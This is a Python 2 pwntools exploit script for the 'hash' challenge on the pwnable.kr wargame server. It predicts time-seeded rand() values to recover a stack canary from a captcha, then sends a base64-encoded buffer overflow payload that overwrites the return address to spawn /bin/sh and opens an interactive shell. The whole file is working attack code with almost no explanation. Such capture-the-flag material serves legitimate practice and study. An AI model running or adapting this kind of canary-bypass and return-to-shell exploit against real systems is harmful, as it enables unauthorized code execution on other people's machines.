#!/usr/bin/env python2
import ctypes, base64
from pwn import *
context(arch = 'i386', os = 'linux')

libc = ctypes.CDLL('libc.so.6')

ready = True
if ready:
    conn = remote('pwnable.kr', 9002)
else:
    conn = process(['/home/doublesine/Desktop/hash'])

def SendLine(s):
    sleep(1)
    print s
    conn.sendline(s)

g_buf_addr = 0x0804B0E0
g_buf_size = 1024
current_time = libc.time(0)
libc.srand(current_time)
rands = []
for i in range(8):
    rands.append(libc.rand(None))

print conn.readuntil('Are you human? input captcha : '),
captcha = conn.readline()
print captcha,

# begin calculate canary
canary = int(captcha) - rands[4] + rands[6] - rands[7] - rands[2] + rands[3] - rands[1] - rands[5]
canary %= 2 ** 32
print '[*] canary = 0x%08X' % canary
# end calculate canary

# begin prepare payload
payload = 'a' * 0x200 + \
          pack(canary, 32) + \
          'fuckfuck' + \
          'fuck' + \
          pack(0x08049187, 32) + \
          pack(g_buf_addr + g_buf_size - len('/bin/sh\x00'))
encoded_payload = base64.b64encode(payload)
encoded_payload += '\x00'
encoded_payload += 'a' * (g_buf_size - len(encoded_payload) - len('/bin/sh\x00'))
encoded_payload += '/bin/sh\x00'
# end prepare payload

# begin exploit
sleep(0.5)
conn.send_raw(captcha)
print conn.read(),
SendLine(encoded_payload)
print conn.read(),
# end exploit

# get shell
conn.interactive()
conn.close()
